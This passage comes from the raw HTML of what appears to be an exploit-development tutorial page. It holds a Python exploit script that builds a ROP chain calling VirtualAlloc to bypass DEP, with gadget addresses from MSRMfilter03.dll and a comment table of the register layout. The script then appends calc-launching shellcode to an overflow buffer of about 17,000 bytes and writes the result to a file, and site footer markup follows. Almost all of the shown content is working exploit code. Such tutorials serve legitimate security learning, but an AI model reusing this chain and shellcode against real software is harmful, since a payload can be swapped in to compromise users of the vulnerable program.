#   _In_      SIZE_T dwSize,          =&gt; dwSize (0x1)                 #
#   _In_      DWORD flAllocationType, =&gt; flAllocationType (0x1000)    #
#   _In_      DWORD flProtect         =&gt; flProtect (0x40)             #
# );                                                                  #
#---------------------------------------------------[Register Layout]-#
# Remember (1) the  stack  grows  downwards  so we  need to load the  #
# values into the registers in reverse order! (2) We are going to do  #
# some clever  trickery to  align our  return after  executing.  To   #
# acchieve this we will be filling EDI with a ROP-Nop and we will be  #
# skipping ESP leaving it intact.                                     #
#                                                                     #
# EAX 90909090 =&gt; Nop                                                 #
# ECX 00000040 =&gt; flProtect                                           #
# EDX 00001000 =&gt; flAllocationType                                    #
# EBX 00000001 =&gt; dwSize                                              #
# ESP ???????? =&gt; Leave as is                                         #
# EBP ???????? =&gt; Call to ESP (jmp, call, push,..)                    #
# ESI ???????? =&gt; PTR to VirtualAlloc - DWORD PTR of 0x1005d060       #
# EDI 10019C60 =&gt; ROP-Nop same as EIP                                 #
#---------------------------------------------------------------------#
rop = struct.pack('&lt;L',0x41414141)  # padding to compensate 4-bytes at ESP
rop += struct.pack('&lt;L',0x10029b57) # POP EDI # RETN
rop += struct.pack('&lt;L',0x1002b9ff) # ROP-Nop
                                    #-----------------------------------------[ROP-Nop -&gt; EDI]-#
rop += struct.pack('&lt;L',0x100280de) # POP ECX # RETN
rop += struct.pack('&lt;L',0xffffffff) # will become 0x40
rop += struct.pack('&lt;L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN
rop += struct.pack('&lt;L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
                                    #--------------------------------[flProtect (0x40) -&gt; ECX]-#
rop += struct.pack('&lt;L',0x1002ba02) # POP EAX # RETN
rop += struct.pack('&lt;L',0x1005d060) # kernel32.virtualalloc
rop += struct.pack('&lt;L',0x10027f59) # MOV EAX,DWORD PTR DS:[EAX] # RETN
rop += struct.pack('&lt;L',0x1005bb8e) # PUSH EAX # ADD DWORD PTR SS:[EBP+5],ESI # PUSH 1 # POP EAX # POP ESI # RETN
                                    #------------------------------------[VirtualAlloc -&gt; ESI]-#
rop += struct.pack('&lt;L',0x1003fb3f) # MOV EDX,E58B0001 # POP EBP # RETN
rop += struct.pack('&lt;L',0x41414141) # padding for POP EBP
rop += struct.pack('&lt;L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('&lt;L',0x1A750FFF) # ebx+edx =&gt; 0x1000 flAllocationType
rop += struct.pack('&lt;L',0x10029f3e) # ADD EDX,EBX # POP EBX # RETN 10
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
                                    #-----------------------[flAllocationType (0x1000) -&gt; EDX]-#
rop += struct.pack('&lt;L',0x100532ed) # POP EBP # RETN
rop += struct.pack('&lt;L',0x100371f5) # CALL ESP
                                    #----------------------------------------[CALL ESP -&gt; EBP]-#
rop += struct.pack('&lt;L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('&lt;L',0xffffffff) # will be 0x1
rop += struct.pack('&lt;L',0x100319d3) # INC EBX # FPATAN # RETN
rop += struct.pack('&lt;L',0x100319d3) # INC EBX # FPATAN # RETN
                                    #------------------------------------[dwSize (0x1) -&gt; EBX]-#
rop += struct.pack('&lt;L',0x10030361) # POP EAX # RETN
rop += struct.pack('&lt;L',0x90909090) # NOP
                                    #---------------------------------------------[NOP -&gt; EAX]-#
rop += struct.pack('&lt;L',0x10014720) # PUSHAD # RETN
                                    #----------------------------------------[PUSHAD -&gt; pwnd!]-#

# SkyLined's Calc shellcode
calc = (
"\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64"
"\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B"
"\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20"
"\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07"
"\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74"
"\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7")

#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0a'                                            #
# kernel32.virtualalloc: 0x1005d060 (MSRMfilter03.dll)                #
# EIP: 0x10019C60 Random RETN (MSRMfilter03.dll)                      #
#---------------------------------------------------------------------#
shell = &quot;\x90&quot;*5 + calc
crash = &quot;http://.&quot; + &quot;A&quot;*17416 + &quot;\x60\x9C\x01\x10&quot; + rop + shell + &quot;C&quot;*(7572-len(rop + shell))

writeFile = open (file, &quot;w&quot;)
writeFile.write( crash )
writeFile.close()</pre>
</div>

<p>&nbsp;</p>
    
    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
          <div class="caption">
          <a href="images/Big_rop7.png" rel="prettyPhoto[part7]">
          <img src="images/Small_rop7.png" alt="" class="pic" />
          <span class="hover-effect zoom"></span></a>
          </div><!-- hover effect -->
          <p>Calc</p>
      </div>

<br />
</div>
    </div>
</div>
      
      <!-- End  -->
    	</div>    
    </div><!-- End page-columns -->
     
         <div align="center"><script>
           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
           var idcomments_post_id;
           var idcomments_post_url;
           </script>
             <span id="IDCommentsPostTitle" style="display:none"></span>
           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
         </div>
     
  </div><!-- <<< End Container >>> -->
  
  <footer>
    <div class="container">
    
      
      <div class="six columns"><span class="copyright">
      © Copyright <a href="../../index.html">FuzzySecurity</a></span></div>
      
      <div class="six columns">
        
          <p><a href="../../index.html">Home</a> |
          <a href="../../tutorials.html">Tutorials</a> |
          <a href="../../coding.html">Scripting</a> |
          <a href="../../exploits.html">Exploits</a> |
          <a href="../../links.html">Links</a> |
          <a href="../../contact.html">Contact</a></p>
        
      </div>
    
    </div><!-- End container -->
  </footer><!-- <<< End Footer >>> -->
  
  </div><!-- End wrap -->
  
  <!-- Start Style Switcher -->
  <div class="switcher"></div>
  <!-- End Style Switcher -->
    
</body>
</html>